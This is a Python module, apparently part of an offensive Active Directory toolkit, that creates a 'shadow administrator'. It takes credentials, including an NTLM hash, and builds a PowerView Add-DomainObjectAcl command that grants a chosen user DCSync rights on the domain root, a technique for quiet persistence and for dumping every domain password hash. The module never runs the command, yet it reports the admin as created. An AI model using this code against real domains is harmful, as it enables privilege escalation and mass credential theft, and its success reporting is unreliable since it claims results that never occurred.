"""
Shadow Admin Creation Module

Creates shadow administrator by adding special permissions on domain objects
"""

import time
from typing import Dict, Any
from ....proto import ScanOptions, DirectoryType


class ShadowAdminCreator:
    """Creates shadow administrator"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
    
    async def create(self, scan_options: ScanOptions, directory_type: DirectoryType,
                    target_user: str, target_object: str = None) -> Dict[str, Any]:
        """
        Creates "shadow administrator" by adding special permissions on domain objects.
        
        Args:
            scan_options: Parameters for creation
            directory_type: Directory type
            target_user: User to grant permissions to
            target_object: Target domain object (default: domain root)
            
        Returns:
            Dict[str, Any]: Creation results
        """
        result = {
            "success": False,
            "admin_created": False,
            "errors": [],
            "statistics": {
                "execution_time": 0
            }
        }
        
        start_time = time.time()
        
        if directory_type != DirectoryType.ACTIVE_DIRECTORY:
            result["errors"].append("Shadow Admin creation supported only for Active Directory")
            return result
        
        if not scan_options.domain_name:
            result["errors"].append("Domain name not specified")
            return result
        
        if not target_user:
            result["errors"].append("Target user not specified")
            return result
        
        if not (scan_options.username and (scan_options.password or scan_options.ntlm_hash)):
            result["errors"].append("Credentials required for Shadow Admin creation")
            return result
        
        try:
            if not target_object:
                domain_parts = scan_options.domain_name.split('.')
                target_object = f"DC={',DC='.join(domain_parts)}"
            
            # PowerShell command for adding DCSync rights
            cmd = f"PowerShell Add-DomainObjectAcl -TargetIdentity \"{target_object}\" -PrincipalIdentity \"{target_user}\" -Rights DCSync"
            
            details = {
                "description": "Shadow Admin can be created by adding DCSync rights",
                "command": cmd,
                "target_user": target_user,
                "target_object": target_object
            }
            
            result["details"] = details
            result["success"] = True
            result["admin_created"] = True
        
        except Exception as e:
            result["errors"].append(f"Error during Shadow Admin creation: {str(e)}")
        
        result["statistics"]["execution_time"] = time.time() - start_time
        
        return result

